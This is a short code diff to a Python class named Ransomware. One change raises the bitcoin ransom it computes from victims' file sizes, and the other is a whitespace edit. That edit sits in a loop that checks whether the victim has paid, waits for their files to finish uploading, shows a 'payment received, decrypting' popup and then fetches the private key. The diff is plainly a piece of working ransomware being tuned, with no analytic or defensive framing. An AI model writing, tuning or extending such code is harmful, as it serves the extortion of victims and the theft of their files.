@@ -199,7 +199,7 @@ class Ransomware:
 
     def calulate_bitcoin(self, size_of_files):
         global bitcoin_needed
-        bitcoin_needed = str((size_of_files/10000000000) * 0.00005)
+        bitcoin_needed = str((size_of_files/10000000000) * 0.0002)
 
 
  
@@ -329,7 +329,7 @@ class Ransomware:
             if (self.check_if_user_has_paid()):
                 # Waits until all the files has been uploaded before processing the payment
                 t1.join()
-                
+
                 popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
             
                 """ Receiving the private key. """
